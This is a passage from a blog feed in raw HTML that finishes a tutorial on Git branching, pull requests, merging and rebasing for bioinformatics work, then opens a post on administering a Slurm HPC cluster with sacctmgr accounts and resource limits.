4%, 64%)"># Try to add the file again—it won't be staged now and will show a warning</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> wrong_file.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check status</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> status</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="gitignore" src="https://riverxdata.github.io/river-docs/assets/images/gitignore-d69a2c152f3921ff1f862bb7c4143c1f.png" width="1364" height="325" class="img_ev3q"></p>
<p>Now create a commit with all your staged files:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> commit </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-m</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"feat: add pixi setup"</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="commit" src="https://riverxdata.github.io/river-docs/assets/images/commit-580a0eebc26baf34fe9ee1128bf1de12.png" width="1364" height="132" class="img_ev3q"></p>
<p>Push your changes to GitHub, the remote server that tracks your development progress:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Push to remote</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> push origin feature/environment-setup</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View your remote origin to confirm where updates are pushed</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># This shows I cloned using the SSH credential</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> config </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--get</span><span class="token plain"> remote.origin.url</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># git@github.com:nttg8100/ngs-quality-control-for-blog-example.git</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="push" src="https://riverxdata.github.io/river-docs/assets/images/push_origin-7d1a96c158019affbf96e1db19fa5d8d.png" width="1364" height="263" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="check-updates-on-github">Check Updates on GitHub<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1#check-updates-on-github" class="hash-link" aria-label="Direct link to Check Updates on GitHub" title="Direct link to Check Updates on GitHub" translate="no">​</a></h2>
<p>Visit your GitHub repository to see the new branch. In this example:
<a href="https://github.com/nttg8100/ngs-quality-control-for-blog-example" target="_blank" rel="noopener noreferrer" class="">https://github.com/nttg8100/ngs-quality-control-for-blog-example</a></p>
<p><img decoding="async" loading="lazy" alt="updated_branch" src="https://riverxdata.github.io/river-docs/assets/images/new_branch_created-c0ee2d99a07901b63dfdcc78cf69b947.png" width="1364" height="643" class="img_ev3q"></p>
<p>Now let's move on to remote collaboration with your team.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="pull-request">Pull Request<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1#pull-request" class="hash-link" aria-label="Direct link to Pull Request" title="Direct link to Pull Request" translate="no">​</a></h2>
<p>A Pull Request (PR) compares your changes with the target branch. GitHub provides a concise PR interface that shows what's been added or removed. You can review your own PR, use Copilot, or have teammates review. They can comment on your PR to suggest improvements or identify issues.</p>
<p><strong>Best practices for creating a Pull Request:</strong></p>
<ul>
<li class=""><strong>Keep PRs Small</strong>: Focus on a single feature or fix. Small PRs are easier to review and merge</li>
<li class=""><strong>Clear Description</strong>: Write a concise summary of what the PR does, why it's needed, and any relevant context</li>
<li class=""><strong>Reference Issues</strong>: Link related issues or tickets (e.g., Closes #123)</li>
<li class=""><strong>Self-Review</strong>: Check your code for errors, style, and unnecessary changes before submitting</li>
<li class=""><strong>Add Tests</strong>: Include or update tests to cover your changes</li>
<li class=""><strong>Follow Conventions</strong>: Stick to your team's coding and commit message guidelines</li>
</ul>
<p>To create a PR, select the "Pull requests" tab, click "New pull request", then select your current branch and target branch. We'll continue with our current branch:</p>
<p><img decoding="async" loading="lazy" alt="new_pr" src="https://riverxdata.github.io/river-docs/assets/images/new_pr-7e37441ae6dc22a405f3ca4a33b8c345.png" width="1364" height="643" class="img_ev3q"></p>
<p>The PR is now created:</p>
<p><img decoding="async" loading="lazy" alt="created_pr" src="https://riverxdata.github.io/river-docs/assets/images/created_pr-28d0bdc552e44ddfd3e63057c0524b53.png" width="1364" height="823" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="review">Review<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1#review" class="hash-link" aria-label="Direct link to Review" title="Direct link to Review" translate="no">​</a></h2>
<p><strong>Best practices for reviewing a Pull Request:</strong></p>
<ul>
<li class=""><strong>Understand the Context</strong>: Read the PR description and related issues</li>
<li class=""><strong>Check for Clarity</strong>: Ensure code is readable, well-structured, and commented where necessary</li>
<li class=""><strong>Test Locally</strong>: Run the code if possible to verify it works as intended</li>
<li class=""><strong>Suggest Improvements</strong>: Be constructive and specific in your feedback</li>
<li class=""><strong>Check for Side Effects</strong>: Make sure changes don't break existing functionality</li>
<li class=""><strong>Be Respectful</strong>: Keep feedback positive and focused on the code, not the person</li>
</ul>
<p>Click on "File changes" to start your review. You can comment on specific lines of changed files. In the end, comment on whether changes should be modified or merged. Here I'm the PR creator, so GitHub disables self-approval. In best practice, another person should review your work. <code>LGTM</code> (Looks Good To Me) indicates approval and allows merging your changes into the target branch.</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class="">Request PR review from teammates</li>
<li class="">PR must be approved before merging</li>
</ul></div></div>
<p><img decoding="async" loading="lazy" alt="review" src="https://riverxdata.github.io/river-docs/assets/images/review-28ddf50fe6daebb3b518033e9cc302e1.png" width="2559" height="823" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="merge">Merge<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1#merge" class="hash-link" aria-label="Direct link to Merge" title="Direct link to Merge" translate="no">​</a></h2>
<p>Although your PR is ready to merge without approval in this example, you should configure branch protection rules in your repository settings:
<a href="https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges" target="_blank" rel="noopener noreferrer" class="">https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges</a></p>
<p>When merging a pull request on GitHub, you can choose from several strategies. Each has advantages depending on your workflow:</p>
<table><thead><tr><th>Strategy</th><th>Description</th><th>Use Case</th></tr></thead><tbody><tr><td><strong>Merge Commit</strong></td><td>Combines all commits from the feature branch into the target branch, preserving full history.</td><td>Default; keeps detailed commit history.</td></tr><tr><td><strong>Squash and Merge</strong></td><td>Combines all changes from the feature branch into a single commit on the target branch.</td><td>Clean, concise history for small features.</td></tr><tr><td><strong>Rebase and Merge</strong></td><td>Reapplies your branch's commits on top of the target branch, creating a linear history.</td><td>Linear history, avoids merge commits.</td></tr></tbody></table>
<p><img decoding="async" loading="lazy" alt="merge" src="https://riverxdata.github.io/river-docs/assets/images/merge-53fc5e6914e0a508107da8e8ea6006b6.png" width="1411" height="1225" class="img_ev3q"></p>
<p>When working with a large team, using a merge commit directly integrates your branch into the target branch. This works well if the target branch hasn't changed significantly since you started. For example, if you branched off <code>main</code> when it only had <code>feature A</code> and <code>feature B</code>, and you're adding <code>feature C</code>, merging is straightforward.</p>
<p>However, if other team members have merged new features (e.g., <code>feature C1</code>) into <code>main</code> that modify the same files you're working on, you may encounter conflicts. In such cases, it's best to use rebase to update your branch with the latest changes from the target branch before merging. If your branch contains many small, incremental commits, consider using squash and merge to combine them into a single, clean commit for a tidier history.</p>
<p><img decoding="async" loading="lazy" alt="merge_type" src="https://riverxdata.github.io/river-docs/assets/images/merge-types-3da71d48920fdcbff6af463eb0c8221b.png" width="1607" height="1560" class="img_ev3q"></p>
<p>Now the main branch shows the update from your PR:</p>
<p><img decoding="async" loading="lazy" alt="updated_main" src="https://riverxdata.github.io/river-docs/assets/images/merged_to_main-3d73172135c260d72cee0f707b9a4bb1.png" width="1411" height="766" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="rebase">Rebase<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1#rebase" class="hash-link" aria-label="Direct link to Rebase" title="Direct link to Rebase" translate="no">​</a></h2>
<p>When working in a team, the <code>main</code> branch (or your target branch) may receive updates from other contributors while you're developing your feature branch. To keep your branch up-to-date and avoid conflicts later, regularly update your branch with the latest changes from <code>main</code>. This is where <code>rebase</code> is useful.</p>
<p><strong>Use case:</strong>
Suppose you started working on a feature branch (<code>feature/testing-rebase</code>) based on an older version of <code>main</code>. Meanwhile, new commits have been added to <code>main</code> by others. Rebasing allows you to "replay" your changes on top of the latest <code>main</code>, resulting in a linear and clean history.</p>
<p><strong>How to update your feature branch after <code>main</code> is updated:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Make sure you're on your feature branch</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> checkout feature/testing-rebase</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Fetch the latest changes from the remote repository</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> fetch origin</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Rebase your branch onto the updated main branch</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> rebase origin/main</span><br></span></code></pre></div></div>
<p>During the rebase, if there are conflicts, Git will pause and let you resolve them. After fixing conflicts, continue the rebase:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">resolved-files</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> rebase </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--continue</span><br></span></code></pre></div></div>
<p>If you want to abort the rebase at any point:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> rebase </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--abort</span><br></span></code></pre></div></div>
<p><strong>Why use rebase?</strong></p>
<ul>
<li class="">Keeps your branch history clean and linear</li>
<li class="">Makes it easier to review and merge changes</li>
<li class="">Reduces the chance of complex merge conflicts later</li>
</ul>
<p><strong>Tip:</strong>
After rebasing and before pushing, you may need to force-push your branch since the commit history has changed:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> push --force-with-lease</span><br></span></code></pre></div></div>
<p>Use force-push with care, especially on shared branches.</p>
<p><img decoding="async" loading="lazy" alt="rebase" src="https://riverxdata.github.io/river-docs/assets/images/rebase_on_local-fc01fd9233ff9afeadf0ac790c86629e.png" width="1411" height="260" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="new-branch-again">New branch again<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1#new-branch-again" class="hash-link" aria-label="Direct link to New branch again" title="Direct link to New branch again" translate="no">​</a></h2>
<p>Now you can sync with your team, next step is creating the new branch again to have more updates (features, fix bug, documentation, testing, etc)</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># check out on base branch where feature is updated</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> checkout main</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># pull to update, add rebase for better organization on commits</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> pull </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rebase</span><span class="token plain"> origin main</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># create new branch</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> switch </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> feature/add-cicd-setup</span><br></span></code></pre></div></div>
<p><em>This concludes Part 1 of the RiverXData series on version control in bioinformatics. Stay tuned for Part 2!</em></p>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="git" term="git"/>
        <category label="version-control" term="version-control"/>
        <category label="bioinformatics" term="bioinformatics"/>
        <category label="reproducibility" term="reproducibility"/>
        <category label="pipelines" term="pipelines"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Building a Slurm HPC Cluster (Part 3) - Administration and Best Practices]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3</id>
        <link href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3"/>
        <updated>2026-01-14T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[In Part 1 and Part 2, we built a complete Slurm HPC cluster from a single node to a production-ready multi-node system. Now let's learn how to manage, maintain, and secure it effectively.]]></summary>
        <content type="html"><![CDATA[<p>In <a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1">Part 1</a> and <a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2">Part 2</a>, we built a complete Slurm HPC cluster from a single node to a production-ready multi-node system. Now let's learn how to manage, maintain, and secure it effectively.</p>
<p>This final post covers daily administration tasks, troubleshooting, security hardening, and integration with data processing frameworks.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="series-overview">Series Overview<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#series-overview" class="hash-link" aria-label="Direct link to Series Overview" title="Direct link to Series Overview" translate="no">​</a></h2>
<ul>
<li class=""><strong><a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1">Part 1</a></strong>: Introduction, Architecture, and Single Node Setup</li>
<li class=""><strong><a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2">Part 2</a></strong>: Scaling to Production with Ansible</li>
<li class=""><strong>Part 3 (This Post)</strong>: Administration and Best Practices</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="administration-overview">Administration Overview<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#administration-overview" class="hash-link" aria-label="Direct link to Administration Overview" title="Direct link to Administration Overview" translate="no">​</a></h2>
<p>Managing a Slurm cluster involves several key areas:</p>
<ul>
<li class=""><strong>Cluster Management</strong>: Build, maintain, and update the cluster via Ansible</li>
<li class=""><strong>User Management</strong>: Synchronize users across nodes with proper permissions</li>
<li class=""><strong>Login Security</strong>: Implement SSH hardening with 2FA or key pairs</li>
<li class=""><strong>Resource Management</strong>: Enforce limits and fair-share policies</li>
<li class=""><strong>Monitoring</strong>: Track performance and resource utilization</li>
<li class=""><strong>Troubleshooting</strong>: Diagnose and resolve issues</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="user-and-resource-management">User and Resource Management<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#user-and-resource-management" class="hash-link" aria-label="Direct link to User and Resource Management" title="Direct link to User and Resource Management" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="adding-users-and-groups">Adding Users and Groups<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#adding-users-and-groups" class="hash-link" aria-label="Direct link to Adding Users and Groups" title="Direct link to Adding Users and Groups" translate="no">​</a></h3>
<p>Slurm uses accounts (groups) to organize users and apply resource policies:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add a new account/group</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> account research_team </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">Description</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"Research Team"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add a user to an account</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> user john </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">account</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">research_team</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add user with multiple accounts</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> user alice </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">account</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">research_team,dev_team </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">DefaultAccount</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">research_team</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View accounts</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr show account</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View users</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr show user</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="setting-resource-limits">Setting Resource Limits<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#setting-resource-limits" class="hash-link" aria-label="Direct link to Setting Resource Limits" title="Direct link to Setting Resource Limits" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="account-level-limits">Account-Level Limits<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#account-level-limits" class="hash-link" aria-label="Direct link to Account-Level Limits" title="Direct link to Account-Level Limits" translate="no">​</a></h4>
<p>Control resources for entire groups:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Limit CPU minutes (prevents monopolizing cluster)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr modify account research_team </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">GrpCPUMins</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">100000</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Limit memory (in MB)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr modify account research_team </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">GrpMem</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">500000</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Limit concurrent jobs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr modify account research_team </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">GrpJobs</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">50</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Limit concurrent running jobs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr modify account research_team </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">GrpJobsRun</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">20</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Limit number of nodes</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacctmgr modify account research_team </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">GrpNodes</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">10</span><br></span></code></pre></div></div>
